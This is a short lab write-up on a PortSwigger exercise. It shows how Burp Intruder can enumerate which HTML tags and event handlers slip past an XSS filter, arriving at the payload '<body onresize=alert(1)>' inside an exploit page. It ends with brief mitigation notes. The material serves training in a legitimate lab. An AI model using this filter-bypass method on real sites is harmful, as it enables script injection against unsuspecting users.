# Lab11 - Reflected XSS Into HTML Context With Most Tags And Attributes Blocked

## Objective

Exploit a reflected XSS vulnerability where most HTML tags and attributes are blocked by a filter.

Execute:

```javascript
alert(1)
```

to solve the lab.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | Reflected XSS |
| Difficulty | Practitioner |
| Context | HTML Context |
| Platform | PortSwigger |

---

# Vulnerability Overview

The application filters many HTML tags and attributes.

Our goal is to identify:

```text
Allowed Tags
        ↓
Allowed Events
        ↓
Working Payload
```

---

# Analysis

## Step 1

Intercept request using Burp.

---

## Step 2

Send request to:

```text
Intruder
```

---

## Step 3

Enumerate allowed tags.

Payload list:

```html
<script>
<img>
<svg>
<body>
<iframe>
```

---

## Step 4

Observation

Found:

```html
<body>
```

allowed.

---

## Step 5

Enumerate allowed events.

Found:

```html
onresize
```

allowed.

---

# Full Payload(s) Used

```html
<body onresize=alert(1)>
```

---

Final Exploit URL:

```html
<body onresize=alert(1)>
```

embedded inside exploit page.

---

# Why The Payload Works

```text
body Tag Allowed
        ↓
onresize Allowed
        ↓
Resize Event Triggered
        ↓
alert(1)
```

---

# Personal Analysis & Testing Process

## Initial Problem

Most tags blocked.

---

## Strategy

Use Intruder to discover:

```text
Allowed Tags
Allowed Events
```

instead of guessing.

---

## Observation

```html
<body>
```

survived filtering.

---

## Event Discovery

```html
onresize
```

also survived.

---

## Result

Successful execution.

Lab solved.

---

# Mitigation

Whitelist safe HTML.

Use proper HTML sanitization libraries.

---

# Key Learnings

- Intruder is extremely useful for filter bypass.
- Discover allowed tags systematically.
- Discover allowed events systematically.